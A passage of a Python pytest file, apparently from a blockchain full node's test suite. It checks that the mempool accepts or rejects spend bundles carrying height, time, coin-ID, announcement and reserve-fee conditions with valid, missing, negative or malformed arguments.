= ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(-1)])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_invalid_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(5)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.ASSERT_HEIGHT_RELATIVE_FAILED\n    @pytest.mark.asyncio\n    async def test_block_age_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_correct_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_block_age_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(1), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_negative_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_correct_my_id(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin.name()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_id_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin.name(), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_invalid_my_id(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-2].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin_2.name()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_COIN_ID_FAILED\n    @pytest.mark.asyncio\n    async def test_my_id_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_assert_time_exceeds(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 5\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_fail(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 1000\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_SECONDS_ABSOLUTE_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_height_pending(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        print(full_node_1.full_node.blockchain.get_peak())\n        current_height = full_node_1.full_node.blockchain.get_peak().height\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(current_height + 4)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.ASSERT_HEIGHT_ABSOLUTE_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_time_negative(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = -1\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_assert_time_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 5\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_exceeds(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = 3\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_SECONDS_RELATIVE_FAILED\n        for i in range(0, 4):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx2, peer)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = 0\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_negative(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = -3\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_correct_coin_announcement_consumed(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_coin_announcement_garbage(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name(), b\"garbage\"])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\", b\"garbage\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_coin_announcement_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_coin_announcement_missing_arg2(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_coin_announcement_too_big(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), bytes([1] * 10000))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=bundle\n        )\n        try:\n            await full_node_1.full_node.blockchain.receive_block(blocks[-1])\n            assert False\n        except AssertionError:\n            pass\n    @pytest.mark.asyncio\n    async def test_invalid_coin_announcement_rejected(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n                [b\"wrong test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_invalid_coin_announcement_rejected_two(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_1.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_puzzle_announcement(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(0x80))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT, [bytes(0x80)])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(0x80))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name(), b\"garbage\"])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT, [bytes(0x80), b\"garbage\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [b\"test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_missing_arg2(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_invalid_puzzle_announcement_rejected(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(\"test\", \"utf-8\"))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [b\"wrong test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_invalid_puzzle_announcement_rejected_two(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n                [b\"test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is not None\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is not None\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_negative_fee(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=spend_bundle1\n        )\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name()) is None\n        assert (await full_node_1.full_node.blockchain.receive_block(blocks[-1]))[1] == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_fee_too_large(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(2 ** 64)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=spend_bundle1\n        )\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name()) is None\n        assert (await full_node_1.full_node.blockchain.receive_block(blocks[-1]))[1] == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_wrong_fee(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, 